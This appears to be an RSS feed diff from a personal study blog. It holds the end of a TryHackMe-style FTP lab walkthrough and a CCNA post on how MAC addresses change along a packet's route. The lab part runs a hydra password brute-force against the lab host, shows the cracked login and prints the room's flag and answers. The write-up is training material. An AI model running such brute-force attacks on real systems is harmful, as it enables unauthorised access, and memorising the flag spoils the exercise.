+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">10</span><span>ftp&gt; ls
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">11</span><span><span style="color:#fab387">200</span> PORT <span style="color:#89dceb">command</span> successful. Consider using PASV.
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">12</span><span><span style="color:#fab387">150</span> Here comes the directory listing.
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">13</span><span>-rw-r--r--    <span style="color:#fab387">1</span> <span style="color:#fab387">0</span>        <span style="color:#fab387">0</span>             <span style="color:#fab387">353</span> Apr <span style="color:#fab387">24</span>  <span style="color:#fab387">2020</span> PUBLIC_NOTICE.txt
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">14</span><span><span style="color:#fab387">226</span> Directory send OK.
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">15</span><span>ftp&gt;</span></span></code></pre></div>
+<br>
+<p>What do we think a possible username could be?</p>
+
+
+
+
+
+
+<pre tabindex="0"><code>Mike</code></pre>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 1</span><span>ftp&gt; get PUBLIC_NOTICE.txt
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 2</span><span>local: PUBLIC_NOTICE.txt remote: PUBLIC_NOTICE.txt
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 3</span><span><span style="color:#fab387">200</span> PORT <span style="color:#89dceb">command</span> successful. Consider using PASV.
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 4</span><span><span style="color:#fab387">150</span> Opening BINARY mode data connection <span style="color:#cba6f7">for</span> PUBLIC_NOTICE.txt <span style="color:#89dceb;font-weight:bold">(</span><span style="color:#fab387">353</span> bytes<span style="color:#89dceb;font-weight:bold">)</span>.
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 5</span><span><span style="color:#fab387">226</span> Transfer complete.
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 6</span><span><span style="color:#fab387">353</span> bytes received in 0.00 secs <span style="color:#89dceb;font-weight:bold">(</span>226.4958 kB/s<span style="color:#89dceb;font-weight:bold">)</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 7</span><span>ftp&gt; bye
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 8</span><span><span style="color:#fab387">221</span> Goodbye.
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 9</span><span>root@ip-10-10-87-146:~# ls
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">10</span><span>burp.json   Desktop    Instructions  Postman            Rooms    thinclient_drives
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">11</span><span>CTFBuilder  Downloads  Pictures      PUBLIC_NOTICE.txt  Scripts  Tools
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">12</span><span>root@ip-10-10-87-146:~# cat PUBLIC_NOTICE.txt
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">13</span><span><span style="color:#89dceb;font-weight:bold">===================================</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">14</span><span>MESSAGE FROM SYSTEM <span style="color:#f5e0dc">ADMINISTRATORS</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">15</span><span><span style="color:#89dceb;font-weight:bold">===================================</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">16</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">17</span><span>Hello,
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">18</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">19</span><span>I hope everyone is aware that the
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">20</span><span>FTP server will not be available
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">21</span><span>over the weekend- we will be
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">22</span><span>carrying out routine system
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">23</span><span>maintenance. Backups will be
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">24</span><span>made to my account so I reccomend
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">25</span><span>encrypting any sensitive data.
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">26</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">27</span><span>Cheers,
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">28</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">29</span><span>Mike</span></span></code></pre></div>
+<h4 id="exploiting-ftp">Exploiting FTP</h4>
+<div style="text-align: center"><img src="./image24.png"></div>
+<br>
+<p>What is the password for user &ldquo;mike&rdquo;?</p>
+
+
+
+
+
+
+<pre tabindex="0"><code>password</code></pre>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 1</span><span>root@ip-10-10-87-146:~# hydra -t <span style="color:#fab387">4</span> -l mike -P /usr/share/wordlists/rockyou.txt -vV 10.10.41.45 ftp
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 2</span><span>Hydra v8.6 <span style="color:#89dceb;font-weight:bold">(</span>c<span style="color:#89dceb;font-weight:bold">)</span> <span style="color:#fab387">2017</span> by van Hauser/THC - Please <span style="color:#cba6f7">do</span> not use in military or secret service organizations, or <span style="color:#cba6f7">for</span> illegal purposes.
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 3</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 4</span><span>Hydra <span style="color:#89dceb;font-weight:bold">(</span>http://www.thc.org/thc-hydra<span style="color:#89dceb;font-weight:bold">)</span> starting at 2024-06-25 04:40:47
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 5</span><span><span style="color:#89dceb;font-weight:bold">[</span>WARNING<span style="color:#89dceb;font-weight:bold">]</span> Restorefile <span style="color:#89dceb;font-weight:bold">(</span>you have <span style="color:#fab387">10</span> seconds to abort... <span style="color:#89dceb;font-weight:bold">(</span>use option -I to skip waiting<span style="color:#89dceb;font-weight:bold">))</span> from a previous session found, to prevent overwriting, ./hydra.restore
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 6</span><span><span style="color:#89dceb;font-weight:bold">[</span>DATA<span style="color:#89dceb;font-weight:bold">]</span> max <span style="color:#fab387">4</span> tasks per <span style="color:#fab387">1</span> server, overall <span style="color:#fab387">4</span> tasks, <span style="color:#fab387">14344398</span> login tries <span style="color:#89dceb;font-weight:bold">(</span>l:1/p:14344398<span style="color:#89dceb;font-weight:bold">)</span>, ~3586100 tries per task
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 7</span><span><span style="color:#89dceb;font-weight:bold">[</span>DATA<span style="color:#89dceb;font-weight:bold">]</span> attacking ftp://10.10.41.45:21/
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 8</span><span><span style="color:#89dceb;font-weight:bold">[</span>VERBOSE<span style="color:#89dceb;font-weight:bold">]</span> Resolving addresses ... <span style="color:#89dceb;font-weight:bold">[</span>VERBOSE<span style="color:#89dceb;font-weight:bold">]</span> resolving <span style="color:#cba6f7">done</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 9</span><span><span style="color:#89dceb;font-weight:bold">[</span>ATTEMPT<span style="color:#89dceb;font-weight:bold">]</span> target 10.10.41.45 - login <span style="color:#a6e3a1">&#34;mike&#34;</span> - pass <span style="color:#a6e3a1">&#34;123456&#34;</span> - <span style="color:#fab387">1</span> of <span style="color:#fab387">14344398</span> <span style="color:#89dceb;font-weight:bold">[</span>child 0<span style="color:#89dceb;font-weight:bold">]</span> <span style="color:#89dceb;font-weight:bold">(</span>0/0<span style="color:#89dceb;font-weight:bold">)</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">10</span><span><span style="color:#89dceb;font-weight:bold">[</span>ATTEMPT<span style="color:#89dceb;font-weight:bold">]</span> target 10.10.41.45 - login <span style="color:#a6e3a1">&#34;mike&#34;</span> - pass <span style="color:#a6e3a1">&#34;12345&#34;</span> - <span style="color:#fab387">2</span> of <span style="color:#fab387">14344398</span> <span style="color:#89dceb;font-weight:bold">[</span>child 1<span style="color:#89dceb;font-weight:bold">]</span> <span style="color:#89dceb;font-weight:bold">(</span>0/0<span style="color:#89dceb;font-weight:bold">)</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">11</span><span><span style="color:#89dceb;font-weight:bold">[</span>ATTEMPT<span style="color:#89dceb;font-weight:bold">]</span> target 10.10.41.45 - login <span style="color:#a6e3a1">&#34;mike&#34;</span> - pass <span style="color:#a6e3a1">&#34;123456789&#34;</span> - <span style="color:#fab387">3</span> of <span style="color:#fab387">14344398</span> <span style="color:#89dceb;font-weight:bold">[</span>child 2<span style="color:#89dceb;font-weight:bold">]</span> <span style="color:#89dceb;font-weight:bold">(</span>0/0<span style="color:#89dceb;font-weight:bold">)</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">12</span><span><span style="color:#89dceb;font-weight:bold">[</span>ATTEMPT<span style="color:#89dceb;font-weight:bold">]</span> target 10.10.41.45 - login <span style="color:#a6e3a1">&#34;mike&#34;</span> - pass <span style="color:#a6e3a1">&#34;password&#34;</span> - <span style="color:#fab387">4</span> of <span style="color:#fab387">14344398</span> <span style="color:#89dceb;font-weight:bold">[</span>child 3<span style="color:#89dceb;font-weight:bold">]</span> <span style="color:#89dceb;font-weight:bold">(</span>0/0<span style="color:#89dceb;font-weight:bold">)</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">13</span><span><span style="color:#89dceb;font-weight:bold">[</span>21<span style="color:#89dceb;font-weight:bold">][</span>ftp<span style="color:#89dceb;font-weight:bold">]</span> host: 10.10.41.45   login: mike   password: password
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">14</span><span><span style="color:#89dceb;font-weight:bold">[</span>STATUS<span style="color:#89dceb;font-weight:bold">]</span> attack finished <span style="color:#cba6f7">for</span> 10.10.41.45 <span style="color:#89dceb;font-weight:bold">(</span>waiting <span style="color:#cba6f7">for</span> children to <span style="color:#89dceb">complete</span> tests<span style="color:#89dceb;font-weight:bold">)</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">15</span><span><span style="color:#fab387">1</span> of <span style="color:#fab387">1</span> target successfully completed, <span style="color:#fab387">1</span> valid password found
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">16</span><span>Hydra <span style="color:#89dceb;font-weight:bold">(</span>http://www.thc.org/thc-hydra<span style="color:#89dceb;font-weight:bold">)</span> finished at 2024-06-25 04:41:03</span></span></code></pre></div>
+<br>
+<p>What is ftp.txt?</p>
+
+
+
+
+
+
+<pre tabindex="0"><code>THM{y0u_g0t_th3_ftp_fl4g}</code></pre>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 1</span><span>root@ip-10-10-87-146:~# ftp 10.10.41.45
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 2</span><span>Connected to 10.10.41.45.
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 3</span><span><span style="color:#fab387">220</span> Welcome to the administrator FTP service.
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 4</span><span>Name <span style="color:#89dceb;font-weight:bold">(</span>10.10.41.45:root<span style="color:#89dceb;font-weight:bold">)</span>: mike
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 5</span><span><span style="color:#fab387">331</span> Please specify the password.
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 6</span><span>Password:
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 7</span><span><span style="color:#fab387">230</span> Login successful.
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 8</span><span>Remote system <span style="color:#89dceb">type</span> is UNIX.
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 9</span><span>Using binary mode to transfer files.
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">10</span><span>ftp&gt; ls
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">11</span><span><span style="color:#fab387">200</span> PORT <span style="color:#89dceb">command</span> successful. Consider using PASV.
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">12</span><span><span style="color:#fab387">150</span> Here comes the directory listing.
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">13</span><span>drwxrwxrwx    <span style="color:#fab387">2</span> <span style="color:#fab387">0</span>        <span style="color:#fab387">0</span>            <span style="color:#fab387">4096</span> Apr <span style="color:#fab387">24</span>  <span style="color:#fab387">2020</span> ftp
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">14</span><span>-rwxrwxrwx    <span style="color:#fab387">1</span> <span style="color:#fab387">0</span>        <span style="color:#fab387">0</span>              <span style="color:#fab387">26</span> Apr <span style="color:#fab387">24</span>  <span style="color:#fab387">2020</span> ftp.txt
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">15</span><span><span style="color:#fab387">226</span> Directory send OK.
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">16</span><span>ftp&gt; get ftp.txt
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">17</span><span>local: ftp.txt remote: ftp.txt
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">18</span><span><span style="color:#fab387">200</span> PORT <span style="color:#89dceb">command</span> successful. Consider using PASV.
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">19</span><span><span style="color:#fab387">150</span> Opening BINARY mode data connection <span style="color:#cba6f7">for</span> ftp.txt <span style="color:#89dceb;font-weight:bold">(</span><span style="color:#fab387">26</span> bytes<span style="color:#89dceb;font-weight:bold">)</span>.
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">20</span><span><span style="color:#fab387">226</span> Transfer complete.
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">21</span><span><span style="color:#fab387">26</span> bytes received in 0.00 secs <span style="color:#89dceb;font-weight:bold">(</span>29.6273 kB/s<span style="color:#89dceb;font-weight:bold">)</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">22</span><span>ftp&gt; bye
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">23</span><span><span style="color:#fab387">221</span> Goodbye.
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">24</span><span>root@ip-10-10-87-146:~# cat ftp.txt
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">25</span><span>THM<span style="color:#89dceb;font-weight:bold">{</span>y0u_g0t_th3_ftp_fl4g<span style="color:#89dceb;font-weight:bold">}</span></span></span></code></pre></div>
+]]></content:encoded>
+    </item>
+    <item>
+      <title>[TIL] Life of a Packet</title>
+      <link>http://localhost:1313/til-life-of-a-packet/</link>
+      <pubDate>Mon, 24 Jun 2024 00:00:00 +0000</pubDate><author>leewookb@gmail.com (Wook Lee)</author>
+      <guid>http://localhost:1313/til-life-of-a-packet/</guid>
+      <description>Today, while studying for my CCNA with Jeremy&amp;rsquo;s IT Lab YouTube videos, I learned something very useful that I can&amp;rsquo;t help but write about because I want to remember it for a long time and make the knowledge mine.
+The image below is the network topology used in the Lab.
+PC1 pings PC4.
+Identify the source/destination MAC address at each specified point in the route to PC4. Identify the MAC address by the device and interface (ie.</description>
+      <content:encoded><![CDATA[<p>Today, while studying for my CCNA with Jeremy&rsquo;s IT Lab YouTube videos, I learned something very useful that I can&rsquo;t help but write about because I want to remember it for a long time and make the knowledge mine.</p>
+<div style="text-align: center"><img src="./pepe-internet.gif"></div>
+<hr>
+<p>The image below is the network topology used in the Lab.</p>
+<div style="text-align: center"><img src="./image15.png"></div>
+<p>PC1 pings PC4.</p>
+<p>Identify the source/destination MAC address at each specified point in the route to PC4.
+Identify the MAC address by the device and interface (ie. the MAC of R1 G0/0)
+</br></p>
+<h5 id="q1-sourcedestination-mac-addresses-at-pc1--sw1-segment">Q1. Source/Destination MAC addresses at PC1 → SW1 segment</h5>
+
+
+
+
+
+
+<pre tabindex="0"><code>Source MAC Address: 1111
+Destination MAC Address: AAAA</code></pre>
+
+
+
+
+
+
+<pre tabindex="0"><code>C:\&gt;ipconfig /all
+
+FastEthernet0 Connection:(default port)
+
+Connection-specific DNS Suffix..:
+Physical Address................: 00D0.BA11.1111
+Link-local IPv6 Address.........: FE80::2D0:BAFF:FEE1:6988
+IPv6 Address....................: ::
+IPv4 Address....................: 192.168.1.1
+Subnet Mask.....................: 255.255.255.0
+Default Gateway.................: ::
+192.168.1.254
+DHCP Servers....................: 0.0.0.0
+DHCPv6 IAID.....................:
+DHCPv6 Client DUID..............: 00-01-00-01-09-99-E5-2C-00-D0-BA-11-11-11
+DNS Servers.....................: ::
+0.0.0.0</code></pre>
+<p>the last four digits of PC1&rsquo;s MAC Address is <strong>1111</strong> . We are sending a packet from PC1 to PC4, which means the source IP Address is <strong>192.168.1.1</strong> (PC1&rsquo;s IP Address) and the destination IP Address is <strong>192.168.3.1</strong> (PC4&rsquo;s IP Address). The source and destination IP Address remain unchanged throughout the communication. Because PC4 is located on a different network, PC1 will encapsulate the packet with an Ethernet header and the destination MAC address will be the MAC address of its <strong>default gateway</strong>. In this case, it&rsquo;s R1&rsquo;s g0/0 interface. It will be the destination MAC address.</p>
+
+
+
+
+
+
+<pre tabindex="0"><code>R1&gt;enable
+R1#show interfaces g0/0
+GigabitEthernet0/0 is up, line protocol is up (connected)
+Hardware is CN Gigabit Ethernet, address is 0000.01aa.aaaa (bia 00d0.ff77.0101)</code></pre>
+<p>The last four digits of R1&rsquo;s g0/0 interface MAC address is <strong>aaaa</strong> .</p>
+<div style="text-align: center"><img src="./image16.png"></div>
+<br/>
+<h5 id="q2-sourcedestination-mac-addresses-at-sw1--r1-segment">Q2. Source/Destination MAC addresses at SW1 → R1 segment.</h5>
+
+
+
+
+
+
+<pre tabindex="0"><code>Source MAC Address: 1111
+Destination MAC Address: AAAA</code></pre>
+<p>The Source/Destination MAC addresses at SW1 to R1 segment should be the same as Q1. Switches do not change the source and destination MAC addresses in the frame. It will simply use the source MAC address field in the Ethernet header to learn PC1&rsquo;s MAC address if it doesn&rsquo;t already know it, and then forward the frame to the proper destination, or flood it if it hasn&rsquo;t learned the destination MAC address yet.</p>
+<br/>
+<h5 id="q3-sourcedestination-mac-addresses-at-r1--r2-segment">Q3. Source/Destination MAC addresses at R1 → R2 segment</h5>
+
+
+
+
+
+
+<pre tabindex="0"><code>Source MAC address: BBBB
+Destination MAC address: CCCC</code></pre>
+<p>Like I already mentioned, the source and destination IP addresses will remain the same, as R1 encapsulates the packet with an Ethernet header, it will use the MAC address of its g0/1 interface as the source MAC address and the MAC address of R2&rsquo;s g0/0 interface, which is the next hop in the route, as the destination MAC address.</p>
+<div style="text-align: center"><img src="./image17.png"></div>
+<p>The last four digits of R1&rsquo;s g0/1 interface MAC address is <strong>BBBB</strong>.</p>
+<div style="text-align: center"><img src="./image18.png"></div>
+<p>The last four digits of R2&rsquo;s g0/0 interface MAC address is <strong>CCCC</strong>.</p>
+<div style="text-align: center"><img src="./image19.png"></div>
+<p>Here, on Cisco Packet Tracer, we can confirm the source/destination MAC address on the Ethernet header in Layer 2.</p>
+<br/>
+<h5 id="q4-sourcedestination-mac-addresses-at-r2--r3-segment">Q4. Source/Destination MAC addresses at R2 → R3 segment.</h5>
+
+
+
+
+
+
+<pre tabindex="0"><code>Source MAC address: DDDD
+Destination MAC address: EEEE</code></pre>
+<p>The source MAC address will be R2&rsquo;s interface g0/1 and the destination MAC address will be R3&rsquo;s interface g0/0.</p>
+<div style="text-align: center"><img src="./image20.png"></div>
+<p>The last four digits of R2&rsquo;s interface g0/1 MAC address is <strong>DDDD</strong>.</p>
+<div style="text-align: center"><img src="./image21.png"></div>
+<p>The last four digits of R3&rsquo;s interface g0/0 MAC address is <strong>EEEE</strong>.</p>
+<div style="text-align: center"><img src="./image22.png"></div>
+<br/>
+<h5 id="q5-e-sourcedestination-mac-addresses-at-r3--sw2-segment">Q5. E. Source/Destination MAC addresses at R3 → SW2 segment.</h5>
+
+
+
+
+
+
+<pre tabindex="0"><code>Source MAC address: FFFF
+Destination MAC address: 4444</code></pre>
+<p>At this point, the destination IP address is part of a network connected to R3, <strong>192.168.3.0/24</strong> , so R3 knows it can send the packet directly to PC4. So, it will set the destination MAC address to PC4&rsquo;s MAC address, and use its own address as the source.</p>
+<p>The source MAC address will be R3&rsquo;s g0/1 interface, which is <strong>FFFF</strong> .</p>
+<div style="text-align: center"><img src="./image23.png"></div>
+<p>The destination MAC address will be PC4&rsquo;s MAC address, which turned out to be <strong>4444</strong> (the last 4 digits).</p>
+
+
+
+
+
+
+<pre tabindex="0"><code>Cisco Packet Tracer PC Command Line 1.0
+C:\&gt;ipconfig /all
+
+FastEthernet0 Connection:(default port)
+
+Connection-specific DNS Suffix..:
+Physical Address................: 000C.8544.4444
+Link-local IPv6 Address.........: FE80::20C:85FF:FEC4:BDB4
+IPv6 Address....................: ::
+IPv4 Address....................: 192.168.3.1
+Subnet Mask.....................: 255.255.255.0
+Default Gateway.................: ::
+192.168.3.254
+DHCP Servers....................: 0.0.0.0
+DHCPv6 IAID.....................:
+DHCPv6 Client DUID..............: 00-01-00-01-2D-AC-7E-D8-00-0C-85-44-44-44
+DNS Servers.....................: ::
+0.0.0.0</code></pre>
+<br/>
+<h5 id="q6-sourcedestination-mac-addresses-at-sw2--pc4-segment">Q6. Source/Destination MAC addresses at SW2 → PC4 segment.</h5>
+
+
+
+
+
+
+<pre tabindex="0"><code>Source MAC address: FFFF
+Destination MAC address: 4444</code></pre>
+<p>The answer for Q6 is the same as Q5 because the SW2 only forwards the frame. The switch does not alter the source or destination MAC addresses in the Ethernet frame. The switch&rsquo;s role is to efficiently forward the frame to the correct destination based on its MAC address table. If it doesn&rsquo;t already know the destination MAC address, it will flood the frame.</p>
+]]></content:encoded>
+    </item>
+    <item>
+      <title>[TIL] Port</title>
+      <link>http://localhost:1313/til-port/</link>
